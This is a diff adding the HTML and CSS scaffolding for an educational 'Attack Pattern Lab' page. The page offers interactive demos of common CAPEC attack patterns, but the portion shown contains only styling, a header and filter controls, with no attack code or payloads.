@@ -1,0 +1,2715 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Attack Pattern Lab</title>
+<meta name="description" content="Interactive step-through demos of common CAPEC attack patterns — concept first, no real exploits.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+/* === DESIGN TOKENS — colorful gamified hub, accent-violet palette === */
+:root {
+  --bg: #f5f3ff;
+  --surface: #ffffff;
+  --sf2: #ede9fe;
+  --sf3: #fafafa;
+  --fg: #1c1845;
+  --fg2: #4a4680;
+  --fgm: #9290b8;
+  --bdr: rgba(90,80,200,0.13);
+  --acc: #5c3dcc;
+  --acc-s: #ede9fe;
+  --teal: #0891b2;
+  --teal-s: #e0f4fb;
+  --green: #059669;
+  --green-s: #d1fae5;
+  --orange: #d97706;
+  --orange-s: #fef3c7;
+  --red: #dc2626;
+  --red-s: #fee2e2;
+  --yellow: #ca8a04;
+  --fd: 'Outfit', system-ui, sans-serif;
+  --fm: 'JetBrains Mono', 'Fira Code', monospace;
+  --r: 16px;
+  --rs: 10px;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0e0c1c; --surface: #16132c; --sf2: #1e1a3e; --sf3: #12101f;
+    --fg: #e8e4ff; --fg2: #9e9acc; --fgm: #6862a0;
+    --bdr: rgba(140,130,230,0.18);
+    --acc: #7c5be8; --acc-s: #211a4a;
+    --teal: #22d3ee; --teal-s: #0a2030;
+    --green: #34d399; --green-s: #062018;
+    --orange: #fbbf24; --orange-s: #1e1400;
+    --red: #f87171; --red-s: #200808;
+    --yellow: #fcd34d;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0e0c1c; --surface: #16132c; --sf2: #1e1a3e; --sf3: #12101f;
+  --fg: #e8e4ff; --fg2: #9e9acc; --fgm: #6862a0;
+  --bdr: rgba(140,130,230,0.18);
+  --acc: #7c5be8; --acc-s: #211a4a;
+  --teal: #22d3ee; --teal-s: #0a2030;
+  --green: #34d399; --green-s: #062018;
+  --orange: #fbbf24; --orange-s: #1e1400;
+  --red: #f87171; --red-s: #200808;
+  --yellow: #fcd34d;
+  color-scheme: dark;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--fd);background:var(--bg);color:var(--fg);min-height:100vh;
+  padding-left:max(16px,env(safe-area-inset-left,0px));
+  padding-right:max(16px,env(safe-area-inset-right,0px));
+  padding-block:0}
+
+/* HEADER */
+.hdr{background:linear-gradient(135deg,#3b1fa8 0%,#5c3dcc 55%,#7c3aed 100%);
+  color:#fff;text-align:center;
+  padding:44px max(20px,env(safe-area-inset-left,0px)) 38px;
+  margin-left:calc(-1 * max(16px,env(safe-area-inset-left,0px)));
+  margin-right:calc(-1 * max(16px,env(safe-area-inset-right,0px)));
+  position:relative;overflow:hidden}
+.hdr::after{content:'';position:absolute;inset:0;pointer-events:none;
+  background:radial-gradient(ellipse at 15% 85%,rgba(255,120,0,.15) 0%,transparent 55%),
+             radial-gradient(ellipse at 85% 15%,rgba(0,210,255,.12) 0%,transparent 55%)}
+.hdr-eye{display:inline-flex;align-items:center;gap:6px;
+  background:rgba(255,255,255,.13);border:1px solid rgba(255,255,255,.22);
+  border-radius:100px;padding:5px 16px;font-size:12px;font-weight:600;
+  letter-spacing:.08em;text-transform:uppercase;margin-bottom:18px}
+h1{font-size:clamp(1.9rem,5vw,3.2rem);font-weight:800;letter-spacing:-.025em;
+  line-height:1.1;text-wrap:balance;margin-bottom:12px}
+.hdr-sub{font-size:1rem;opacity:.83;max-width:460px;margin:0 auto 28px;line-height:1.55}
+em{font-style:italic}
+.prog-wrap{display:flex;align-items:center;justify-content:center;gap:12px;font-size:13px;opacity:.9}
+.prog-rail{width:180px;height:6px;background:rgba(255,255,255,.22);border-radius:3px;overflow:hidden}
+.prog-fill{height:100%;background:#fff;border-radius:3px;transition:width .5s ease;width:0%}
+
+/* MAIN */
+main{max-width:1060px;margin:0 auto;padding-block:38px 64px}
+.grid-meta{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+.grid-lbl{font-size:12px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;
+  color:var(--fgm)}
+.clear-filters{font-size:12px;font-weight:600;color:var(--acc);background:none;border:none;
+  cursor:pointer;padding:0;text-decoration:underline;text-underline-offset:2px;
+  opacity:0;pointer-events:none;transition:opacity .15s;font-family:var(--fd)}
+.clear-filters.vis{opacity:1;pointer-events:all}
+/* ─── FILTER TOOLBAR ─── */
+.filter-bar{display:flex;flex-direction:column;gap:10px;margin-bottom:22px}
+.search-wrap{position:relative}
+.search-input{width:100%;padding:10px 14px 10px 40px;
+  border:1.5px solid var(--bdr);border-radius:var(--rs);
+  background:var(--surface);color:var(--fg);font-family:var(--fd);font-size:14px;
+  outline:none;transition:border-color .18s,box-shadow .18s;-webkit-appearance:none}
+.search-input::placeholder{color:var(--fgm)}
+.search-input:focus{border-color:var(--acc);box-shadow:0 0 0 3px var(--acc-s)}
+.search-ico{position:absolute;left:13px;top:50%;transform:translateY(-50%);
+  color:var(--fgm);font-size:14px;pointer-events:none;line-height:1}
+.filter-row{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.filter-lbl{font-size:11px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;
+  color:var(--fgm);white-space:nowrap;flex-shrink:0}
+.filter-pills{display:flex;gap:6px;flex-wrap:wrap}
+.fpill{font-family:var(--fd);font-size:12px;font-weight:600;padding:5px 13px;
+  border-radius:100px;border:1.5px solid var(--bdr);
+  background:transparent;color:var(--fg2);cursor:pointer;line-height:1.4;
+  transition:border-color .15s,background .15s,color .15s;white-space:nowrap}
+.fpill:hover{border-color:var(--acc);color:var(--acc)}
+.fpill.fp-on{background:var(--acc);border-color:var(--acc);color:#fff}
+.diff-filter{display:flex;gap:6px;flex-wrap:wrap}
+.dpill{font-family:var(--fd);font-size:12px;font-weight:600;padding:5px 12px;
+  border-radius:100px;border:1.5px solid var(--bdr);
+  background:transparent;color:var(--fg2);cursor:pointer;line-height:1.4;
+  display:flex;align-items:center;gap:4px;
+  transition:border-color .15s,background .15s,color .15s}
+.dpill:hover{border-color:var(--acc)}
+.dpill.dp-on{background:var(--acc-s);border-color:var(--acc);color:var(--acc)}
+.dpill .dpd{width:6px;height:6px;border-radius:50%;background:var(--bdr);flex-shrink:0;transition:background .15s}
+.dpill.dp-on .dpd.f{background:var(--acc)}
+.dpill .dpd.e{background:var(--bdr)}
+.no-results{text-align:center;padding:52px 16px;color:var(--fgm)}
+.no-results .nr-ico{font-size:34px;margin-bottom:12px}
+.no-results p{font-size:.9rem;line-height:1.6}
+.card-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(262px,1fr));gap:18px}
+
+/* CARD */
+.card{background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--r);
+  padding:22px;cursor:pointer;position:relative;overflow:hidden;outline:none;
+  transition:transform .18s ease,box-shadow .18s ease,border-color .18s ease}
+.card:hover,.card:focus-visible{transform:translateY(-4px);
+  box-shadow:0 16px 44px rgba(0,0,0,.12);border-color:var(--acc)}
+.card.done{border-color:var(--green)}
+.card-chk{position:absolute;top:13px;right:13px;width:23px;height:23px;
+  background:var(--green);border-radius:50%;display:flex;align-items:center;
+  justify-content:center;font-size:12px;color:#fff;opacity:0;
+  transform:scale(.4);transition:opacity .3s,transform .3s cubic-bezier(.34,1.56,.64,1)}
+.card.done .card-chk{opacity:1;transform:scale(1)}
+.card-ico{width:50px;height:50px;border-radius:14px;display:flex;align-items:center;
+  justify-content:center;font-size:24px;margin-bottom:14px}
+.card-capec{font-family:var(--fm);font-size:11px;color:var(--fgm);
+  letter-spacing:.04em;margin-bottom:5px}
+.card-name{font-size:1.12rem;font-weight:700;letter-spacing:-.01em;
+  margin-bottom:7px;line-height:1.25}
+.card-desc{font-size:.845rem;color:var(--fg2);line-height:1.55;margin-bottom:18px}
+.card-ft{display:flex;align-items:center;justify-content:space-between}
+.cat-tag{font-size:11px;font-weight:700;letter-spacing:.03em;
+  padding:3px 10px;border-radius:100px}
+.diff-dots{display:flex;gap:4px}
+.d-dot{width:7px;height:7px;border-radius:50%;background:var(--bdr)}
+.d-dot.on{background:var(--acc)}
+
+/* MODAL OVERLAY */
+.ovr{position:fixed;inset:0;background:rgba(0,0,0,.55);
+  backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
+  z-index:500;display:flex;align-items:center;justify-content:center;
+  padding:16px max(16px,env(safe-area-inset-left,0px));
+  opacity:0;pointer-events:none;transition:opacity .25s ease}
+.ovr.open{opacity:1;pointer-events:all}
+.modal{background:var(--surface);border-radius:var(--r);width:100%;max-width:700px;
+  max-height:88vh;overflow-y:auto;overscroll-behavior:contain;
+  box-shadow:0 32px 80px rgba(0,0,0,.35);
+  transform:translateY(24px) scale(.97);
+  transition:transform .28s cubic-bezier(.34,1.56,.64,1)}
+.ovr.open .modal{transform:translateY(0) scale(1)}
+
+/* MODAL HEADER */
+.m-top{padding:22px 24px 0;display:flex;justify-content:space-between;
+  align-items:flex-start;gap:12px}
+.m-meta{flex:1;min-width:0}
+.m-badge{display:inline-block;font-family:var(--fm);font-size:11px;font-weight:500;
+  background:var(--acc-s);color:var(--acc);padding:3px 10px;
+  border-radius:100px;margin-bottom:7px}
+.m-title{font-size:1.5rem;font-weight:800;letter-spacing:-.02em;line-height:1.2}
+.close-btn{background:var(--sf2);border:none;width:34px;height:34px;
+  border-radius:50%;cursor:pointer;font-size:16px;color:var(--fgm);
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;
+  transition:background .15s}
+.close-btn:hover{background:var(--bdr)}
+
+/* STEP PIPS */
+.pips{display:flex;gap:5px;padding:18px 24px 0}
+.pip{flex:1;height:4px;border-radius:2px;background:var(--sf2);transition:background .3s}
+.pip.on{background:var(--acc)}
+
+/* VIZ AREA */
+.viz{margin:16px 24px;background:var(--sf2);border-radius:var(--rs);
+  min-height:220px;overflow:hidden;position:relative}
+
+/* STEP TEXT */
+.s-txt{padding:4px 24px 20px}
+.s-h{font-size:1.05rem;font-weight:700;margin-bottom:8px;letter-spacing:-.01em}
+.s-p{font-size:.9rem;color:var(--fg2);line-height:1.68}
+.callout{margin-top:12px;padding:11px 14px;border-radius:0 6px 6px 0;
+  font-size:.84rem;color:var(--fg2);line-height:1.6}
+.callout.acc{background:var(--acc-s);border-left:3px solid var(--acc)}
+.callout.red{background:var(--red-s);border-left:3px solid var(--red)}
+.callout.grn{background:var(--green-s);border-left:3px solid var(--green)}
+.callout.org{background:var(--orange-s);border-left:3px solid var(--orange)}
+
+/* NAV ROW */
+.nav-row{display:flex;align-items:center;justify-content:space-between;
+  padding:4px 24px 24px;gap:12px}
+.btn{font-family:var(--fd);font-size:14px;font-weight:600;
+  padding:9px 22px;border-radius:var(--rs);border:none;cursor:pointer;
+  transition:filter .15s,opacity .15s}
+.btn-p{background:var(--acc);color:#fff}
+.btn-p:hover{filter:brightness(1.12)}
+.btn-s{background:var(--sf2);color:var(--fg2)}
+.btn-s:hover{background:var(--bdr)}
+.btn:disabled{opacity:.38;cursor:default;filter:none}
+.s-ctr{font-size:13px;color:var(--fgm);font-weight:500;
+  min-width:52px;text-align:center}
+
+/* ─── SHARED VIZ UTILITIES ─── */
+.vpad{padding:18px}
+code.ic{font-family:var(--fm);font-size:.85em;background:var(--sf2);
+  padding:1px 5px;border-radius:4px;color:var(--acc)}
+
+/* ─── SQL INJECTION ─── */
+.sql-scene{display:flex;flex-direction:column;gap:12px;padding:16px}
+.mock-form{background:var(--surface);border:1.5px solid var(--bdr);
+  border-radius:var(--rs);padding:14px}
+.mock-form h4{font-size:13px;font-weight:600;margin-bottom:10px;color:var(--fg2)}
+.fld{display:flex;flex-direction:column;gap:4px;margin-bottom:9px}
+.fld label{font-size:10px;font-weight:700;color:var(--fgm);
+  letter-spacing:.05em;text-transform:uppercase}
+.fi{padding:8px 10px;border:1.5px solid var(--bdr);border-radius:7px;
+  font-family:var(--fm);font-size:13px;background:var(--sf3);color:var(--fg)}
+.qbox{background:#1a1828;border-radius:var(--rs);padding:14px;
+  font-family:var(--fm);font-size:12px;line-height:1.9;
+  color:#a9a5d6;white-space:pre-wrap;word-break:break-all}
+.qkw{color:#cba6f7} .qstr{color:#a6e3a1}
+.qinj{color:#f38ba8;font-weight:600;text-decoration:underline wavy rgba(243,139,168,.5)}
+.qcmt{color:#585475} .qhi{color:#fab387;font-weight:700}
+.res-row{display:flex;align-items:center;gap:8px;padding:8px 12px;
+  border-radius:7px;font-size:13px;font-weight:600}
+.res-ok{background:var(--green-s);color:var(--green)}
+.res-bad{background:var(--red-s);color:var(--red)}
+
+/* ─── BRUTE FORCE ─── */
+.bf-scene{padding:16px;display:flex;flex-direction:column;gap:12px}
+.pw-list{display:grid;grid-template-columns:repeat(3,1fr);gap:5px}
+.pwi{font-family:var(--fm);font-size:11px;padding:5px 7px;border-radius:6px;
+  border:1px solid var(--bdr);background:var(--surface);color:var(--fgm);
+  text-align:center;transition:all .15s;opacity:.5}
+.pwi.try{opacity:1;border-color:var(--orange);background:var(--orange-s);
+  color:var(--orange);animation:bftry .25s ease}
+.pwi.fail{opacity:.22;text-decoration:line-through}
+.pwi.win{opacity:1;border-color:var(--green);background:var(--green-s);
+  color:var(--green);font-weight:700}
+@keyframes bftry{from{transform:scale(1.1)}to{transform:scale(1)}}
+.bf-stat{display:flex;align-items:center;justify-content:space-between;
+  background:var(--surface);border:1px solid var(--bdr);border-radius:7px;
+  padding:8px 14px;font-size:13px}
+.bf-stat span{color:var(--fgm)}
+.bf-stat strong{font-family:var(--fm);font-variant-numeric:tabular-nums}
+.str-rows{display:flex;flex-direction:column;gap:8px}
+.str-row{display:flex;align-items:center;gap:10px;font-size:12px}
+.str-lbl{font-weight:600;min-width:80px}
+.str-rail{flex:1;height:8px;background:var(--bdr);border-radius:4px;overflow:hidden}
+.str-fill{height:100%;border-radius:4px;transition:width 1.2s ease}
+.str-time{font-family:var(--fm);font-size:10px;color:var(--fgm);
+  min-width:88px;text-align:right}
+
+/* ─── PHISHING ─── */
+.phish-scene{padding:14px}
+.eml-card{background:var(--surface);border:1.5px solid var(--bdr);
+  border-radius:var(--rs);overflow:hidden}
+.eml-bar{background:var(--sf2);padding:7px 13px;display:flex;
+  align-items:center;gap:8px;border-bottom:1px solid var(--bdr);
+  font-size:12px;color:var(--fgm)}
+.eml-dots{display:flex;gap:5px}
+.eml-dot{width:10px;height:10px;border-radius:50%}
+.eml-flds{padding:11px 13px;border-bottom:1px solid var(--bdr)}
+.ef{display:flex;align-items:baseline;gap:8px;font-size:12.5px;padding:2px 0}
+.ef-l{font-weight:600;color:var(--fgm);min-width:46px;font-size:11px}
+.flag{border-radius:3px;transition:background .2s;position:relative;cursor:default}
+.flag.red{background:rgba(220,38,38,.12);color:var(--red)}
+.flag.ylw{background:rgba(202,138,4,.12);color:var(--yellow)}
+.flag::after{content:attr(data-tip);display:none;position:absolute;
+  bottom:calc(100% + 5px);left:0;background:var(--fg);color:var(--bg);
+  font-size:11px;font-weight:500;padding:5px 10px;border-radius:6px;
+  white-space:nowrap;z-index:20;min-width:180px;white-space:normal;
+  max-width:240px;line-height:1.45}
+.flag:hover::after,.flag.reveal::after{display:block}
+.eml-body{padding:13px;font-size:13px;line-height:1.7}
+.eml-link{color:var(--acc);text-decoration:underline;word-break:break-all}
+.eml-link.bad{color:var(--red)}
+.eml-sig{margin-top:12px;padding-top:10px;border-top:1px solid var(--bdr);
+  font-size:11px;color:var(--fgm)}
+
+/* ─── MITM ─── */
+.mitm-scene{padding:16px 12px}
+.net-row{display:flex;align-items:center;gap:0;justify-content:center;margin-bottom:14px}
+.net-node{display:flex;flex-direction:column;align-items:center;gap:5px;
+  z-index:2;min-width:62px}
+.net-ico{width:52px;height:52px;border-radius:14px;display:flex;align-items:center;
+  justify-content:center;font-size:24px;border:2px solid var(--bdr);
+  background:var(--surface);transition:border-color .4s,background .4s}
+.net-ico.act{border-color:var(--teal);background:var(--teal-s)}
+.net-ico.evil{border-color:var(--red);background:var(--red-s)}
+.net-lbl{font-size:11px;font-weight:600;color:var(--fgm)}
+.wire{flex:1;height:3px;background:var(--bdr);position:relative;
+  min-width:28px;overflow:visible;transition:background .4s}
+.wire.act{background:var(--teal)}
+.wire.evil{background:var(--red)}
+.pkt{position:absolute;top:50%;transform:translateY(-50%);
+  width:12px;height:12px;border-radius:50%;transition:left 1.5s linear;z-index:3}
+.leg-row{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:8px}
+.leg-i{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--fg2)}
+.leg-dot{width:10px;height:10px;border-radius:50%}
+.info-box{background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--rs);
+  padding:12px;font-size:12px;color:var(--fg2);line-height:1.6}
+.info-box strong{color:var(--fg)}
+
+/* ─── XSS ─── */
+.xss-scene{padding:14px;display:flex;flex-direction:column;gap:10px}
+.brow{background:var(--surface);border:1.5px solid var(--bdr);
+  border-radius:var(--rs);overflow:hidden}
+.b-bar{background:var(--sf2);border-bottom:1px solid var(--bdr);
+  padding:7px 10px;display:flex;align-items:center;gap:7px}
+.b-dots{display:flex;gap:4px}
+.b-dot{width:9px;height:9px;border-radius:50%}
+.b-url{flex:1;background:var(--sf3);border:1px solid var(--bdr);border-radius:5px;
+  padding:3px 8px;font-family:var(--fm);font-size:10px;color:var(--fgm)}
+.b-body{padding:12px;font-size:12px;line-height:1.6;min-height:80px}
+.cmt-item{display:flex;gap:7px;padding:7px 0;
+  border-bottom:1px solid var(--bdr);font-size:12px}
+.cmt-ava{width:24px;height:24px;border-radius:50%;background:var(--sf2);
+  display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0}
+.cmt-name{font-weight:600;margin-bottom:2px;font-size:11px}
+.cmt-txt{color:var(--fg2)}
+.cmt-txt.bad{color:var(--red);font-family:var(--fm);font-size:10px}
+.alert-popup{background:#f5f5f5;border:2px solid #aaa;border-radius:8px;
+  padding:12px 16px;display:flex;flex-direction:column;gap:8px;
+  box-shadow:4px 4px 12px rgba(0,0,0,.25);font-size:12px;
+  max-width:210px;margin:10px auto;animation:popIn .3s ease}
+.alert-title{font-weight:700;font-size:13px;border-bottom:1px solid #ddd;
+  padding-bottom:5px;color:#333}
+.alert-msg{color:#444}
+.alert-btn{background:#ddd;border:1px solid #bbb;border-radius:4px;
+  padding:3px 12px;font-size:11px;cursor:default;align-self:center;color:#333}
+@keyframes popIn{from{transform:scale(.7);opacity:0}to{transform:scale(1);opacity:1}}
+
+/* ─── BUFFER OVERFLOW ─── */
+.buf-scene{padding:14px;display:flex;flex-direction:column;gap:12px}
+.mem-section{border:1.5px dashed var(--bdr);border-radius:var(--rs);padding:10px 12px}
+.mem-s-lbl{font-size:10px;font-weight:700;letter-spacing:.07em;
+  text-transform:uppercase;color:var(--fgm);margin-bottom:8px}
+.mem-cells{display:flex;gap:3px;flex-wrap:wrap}
+.mc{width:32px;height:32px;border-radius:6px;border:1.5px solid var(--bdr);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--fm);font-size:9px;font-weight:600;color:var(--fgm);
+  transition:all .25s;background:var(--surface)}
+.mc.buf{background:var(--teal-s);border-color:var(--teal);color:var(--teal)}
+.mc.ov{background:var(--red-s);border-color:var(--red);color:var(--red);
+  animation:mcpop .35s ease}
+.mc.ret{background:var(--orange-s);border-color:var(--orange);color:var(--orange)}
+.mc.own{background:var(--acc-s);border-color:var(--acc);color:var(--acc);
+  animation:mcpop .35s ease}
+@keyframes mcpop{0%{transform:scale(1)}40%{transform:scale(1.22)}100%{transform:scale(1)}}
+
+/* ─── CLICKJACKING ─── */
+.cj-scene{padding:16px;display:flex;flex-direction:column;gap:12px}
+.cj-wrap{position:relative;border-radius:var(--rs);overflow:hidden}
+.real-pg{background:var(--surface);border:1.5px solid var(--bdr);
+  border-radius:var(--rs);padding:16px}
+.real-pg h3{font-size:14px;margin-bottom:8px;font-weight:700}
+.real-pg p{font-size:12px;color:var(--fg2);margin-bottom:12px}
+.cj-btn{display:inline-block;padding:8px 18px;border-radius:7px;font-size:13px;
+  font-weight:600;cursor:pointer;border:none;font-family:var(--fd)}
+.cj-btn.leg{background:var(--acc);color:#fff}
+.cj-btn-wrap{position:relative;display:inline-block}
+.evil-overlay{position:absolute;inset:-5px;border-radius:10px;
+  border:2px dashed var(--red);background:rgba(220,38,38,.06);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  pointer-events:none;opacity:0;transition:opacity .4s;gap:2px;padding:4px}
+.evil-overlay.show{opacity:1}
+.pp-mini-btn{background:#0070ba;color:#fff;border-radius:24px;
+  padding:7px 14px;font-size:11px;font-weight:700;font-family:Arial,sans-serif;
+  text-align:center;white-space:nowrap}
+.pp-frame{background:#fff;border-radius:10px;border:1px solid #dde1e6;
+  padding:14px;box-shadow:0 2px 8px rgba(0,0,0,.12)}
+.pp-logo-txt{font-size:15px;font-weight:800;color:#003087;font-family:Arial,sans-serif;margin-bottom:10px}
+.pp-lbl{font-size:10px;color:#6c757d;margin-bottom:1px;text-transform:uppercase;letter-spacing:.04em}
+.pp-val{font-size:12px;font-weight:600;color:#2c2e2f;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid #eee}
+.pp-amt-big{font-size:20px;font-weight:800;color:#2c2e2f;margin:2px 0 10px}
+.pp-cta{background:#0070ba;color:#fff;border-radius:24px;padding:9px;
+  font-size:12px;font-weight:700;text-align:center;font-family:Arial,sans-serif;
+  border:none;width:100%;cursor:pointer}
+.evil-btn-lbl{background:rgba(24,119,242,.15);border:2px dashed #1877f2;
+  border-radius:7px;padding:6px 18px;font-size:12px;font-weight:600;color:#1877f2}
+.cj-ctrl{display:flex;align-items:center;gap:10px;font-size:13px}
+.cj-ctrl label{display:flex;align-items:center;gap:7px;cursor:pointer;font-weight:500}
+.cj-ctrl input[type=checkbox]{width:17px;height:17px;accent-color:var(--red);cursor:pointer}
+
+/* ─── TERM TOOLTIPS + REF LINKS ─── */
+.term{border-bottom:1.5px dotted var(--acc);cursor:help;position:relative;display:inline}
+.term::after{content:attr(data-tip);position:absolute;bottom:calc(100% + 7px);left:50%;
+  transform:translateX(-50%);background:var(--fg);color:var(--bg);
+  font-size:11px;font-weight:400;font-family:var(--fd);
+  line-height:1.45;padding:7px 11px;border-radius:7px;
+  white-space:normal;width:max-content;max-width:220px;min-width:130px;
+  pointer-events:none;opacity:0;transition:opacity .15s;z-index:200;text-align:left;
+  box-shadow:0 4px 16px rgba(0,0,0,.22)}
+.term:hover::after{opacity:1}
+a.ref-link{color:var(--acc);text-decoration:underline;text-underline-offset:2px;
+  text-decoration-thickness:1px}
+a.ref-link:hover{text-decoration-thickness:2px}
+
+/* ─── SOCIAL ENGINEERING ─── */
+.se-scene{padding:14px}
+.chat-log{display:flex;flex-direction:column;gap:9px;max-height:195px;
+  overflow-y:auto;padding:4px 0}
+.msg{display:flex;gap:8px;max-width:90%}
+.msg.them{align-self:flex-start}
+.msg.you{align-self:flex-end;flex-direction:row-reverse}
+.msg-ava{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;
+  justify-content:center;font-size:14px;flex-shrink:0}
+.them .msg-ava{background:var(--red-s)}
+.you .msg-ava{background:var(--teal-s)}
+.msg-bbl{border-radius:12px;padding:8px 12px;font-size:12.5px;line-height:1.5;
+  border:1px solid var(--bdr);background:var(--surface)}
+.them .msg-bbl{border-radius:4px 12px 12px 12px}
+.you .msg-bbl{border-radius:12px 4px 12px 12px;background:var(--acc-s)}
+.tactic{font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;
+  color:var(--red);margin-top:3px;margin-left:36px}
+.osint-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:8px}
+.osint-item{background:var(--surface);border:1px solid var(--bdr);border-radius:8px;
+  padding:8px 10px;font-size:11.5px;line-height:1.5}
+.osint-item .oi-lbl{font-weight:700;font-size:10px;color:var(--fgm);
+  text-transform:uppercase;letter-spacing:.05em;margin-bottom:3px}
+.osint-item .oi-val{color:var(--fg)}
+
+/* ─── SHARED NEW VIZ UTILITIES ─── */
+.termbox{background:#1a1828;border-radius:var(--rs);padding:14px;
+  font-family:var(--fm);font-size:11.5px;line-height:1.9;color:#a9a5d6;white-space:pre-wrap;word-break:break-all}
+.t-prompt{color:#a6e3a1}.t-cmd{color:#cba6f7}.t-out{color:#a9a5d6}.t-err{color:#f38ba8}.t-hi{color:#fab387;font-weight:600}
+.breach-row{display:flex;gap:8px;align-items:stretch;margin-bottom:8px}
+.breach-box{flex:1;border:1.5px solid var(--bdr);border-radius:var(--rs);padding:10px;font-size:12px}
+.spray-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
+.spray-item{background:var(--surface);border:1.5px solid var(--bdr);border-radius:8px;
+  padding:8px 6px;text-align:center;font-size:11px;transition:all .25s}
+.spray-item.try{border-color:var(--orange);background:var(--orange-s);color:var(--orange)}
+.spray-item.fail{border-color:var(--bdr);color:var(--fgm);opacity:.45}
+.spray-item.win{border-color:var(--green);background:var(--green-s);color:var(--green);font-weight:700}
+.req-queue{display:flex;flex-direction:column;gap:4px}
+.req-item{background:var(--surface);border:1px solid var(--bdr);border-radius:5px;
+  padding:5px 10px;font-size:11px;font-family:var(--fm);color:var(--fg2);
+  transition:all .2s;opacity:1}
+.req-item.flood{border-color:var(--red);color:var(--red);background:var(--red-s)}
+.req-item.drop{opacity:.22;color:var(--fgm);text-decoration:line-through}
+.req-stat{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px}
+.req-stat div{flex:1;min-width:80px;background:var(--surface);border:1px solid var(--bdr);
+  border-radius:7px;padding:8px 10px;font-size:12px;text-align:center}
+.req-stat strong{display:block;font-family:var(--fm);font-size:18px;font-weight:700}
+.url-bar{display:flex;align-items:center;gap:6px;background:var(--sf2);border:1.5px solid var(--bdr);
+  border-radius:8px;padding:8px 12px;font-family:var(--fm);font-size:12px}
+.url-bar .lock{font-size:13px}
+.cookie-chip{display:inline-block;font-family:var(--fm);font-size:11px;padding:4px 10px;
+  border-radius:6px;background:var(--orange-s);border:1px solid var(--orange);
+  color:var(--orange);margin:2px}
+.dns-scene{padding:14px;display:flex;flex-direction:column;gap:10px}
+.dns-chain{display:flex;align-items:center;justify-content:center;gap:0;flex-wrap:wrap}
+.dns-hop{text-align:center;padding:6px 4px;min-width:60px}
+.dns-hop .dh-ico{font-size:20px;margin-bottom:2px}
+.dns-hop .dh-lbl{font-size:9px;font-weight:700;letter-spacing:.04em;color:var(--fgm);text-transform:uppercase}
+.dns-arr{font-size:13px;color:var(--fgm);padding:0 2px;line-height:3}
+.osint-row{display:flex;gap:8px;flex-wrap:wrap}
+.osint-src{flex:1;min-width:100px;background:var(--surface);border:1.5px solid var(--bdr);
+  border-radius:var(--rs);padding:10px;font-size:11px}
+.osint-src .os-lbl{font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;
+  color:var(--fgm);margin-bottom:5px}
+.perm-row{display:flex;align-items:center;gap:8px;padding:6px 10px;border-radius:7px;
+  font-size:12px;font-family:var(--fm);border:1px solid var(--bdr);background:var(--surface)}
+.perm-row .perm-bit{color:var(--fgm);letter-spacing:.05em}
+.perm-row .perm-hi{color:var(--green);font-weight:700}
+.perm-row .perm-bad{color:var(--red);font-weight:700}
+
+@media(max-width:480px){
+  .card-grid{grid-template-columns:1fr}
+  .pw-list{grid-template-columns:repeat(2,1fr)}
+  .osint-grid{grid-template-columns:1fr}
+  .spray-grid{grid-template-columns:repeat(2,1fr)}
+  h1{font-size:1.7rem}
+}
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.001ms!important;transition-duration:.001ms!important}
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="hdr">
+  <div class="hdr-eye">🛡️ CYBER 266 · CAPEC Reference</div>
+  <h1>Attack Pattern Lab</h1>
+  <p class="hdr-sub">Step through interactive demos that reveal <em>how</em> attacks actually work — concept first, no real exploits.</p>
+  <div class="prog-wrap">
+    <span id="prog-lbl">0 of 8 explored</span>
+    <div class="prog-rail"><div class="prog-fill" id="prog-fill"></div></div>
+  </div>
+</header>
+
+<!-- CARDS -->
+<main>
+  <div class="filter-bar">
+    <div class="search-wrap">
+      <span class="search-ico">🔍</span>
+      <input type="search" class="search-input" id="search-input"
+        placeholder="Search attacks…" autocomplete="off" spellcheck="false" aria-label="Search attack patterns">
+    </div>
+    <div class="filter-row">
+      <span class="filter-lbl">Type</span>
+      <div class="filter-pills" id="cat-pills"></div>
+    </div>
+    <div class="filter-row">
+      <span class="filter-lbl">Difficulty</span>
+      <div class="diff-filter" id="diff-pills"></div>
+    </div>
+  </div>
+  <div class="grid-meta">
+    <div class="grid-lbl" id="grid-lbl">Choose an attack pattern to explore</div>
+    <button class="clear-filters" id="clear-filters">Clear filters ✕</button>
+  </div>
+  <div class="card-grid" id="card-grid"></div>
+  <div class="no-results" id="no-results" hidden>
+    <div class="nr-ico">🔍</div>
+    <p>No patterns match your filters.<br>Try a different search or clear the filters.</p>
+  </div>
+</main>
+
+<!-- MODAL -->
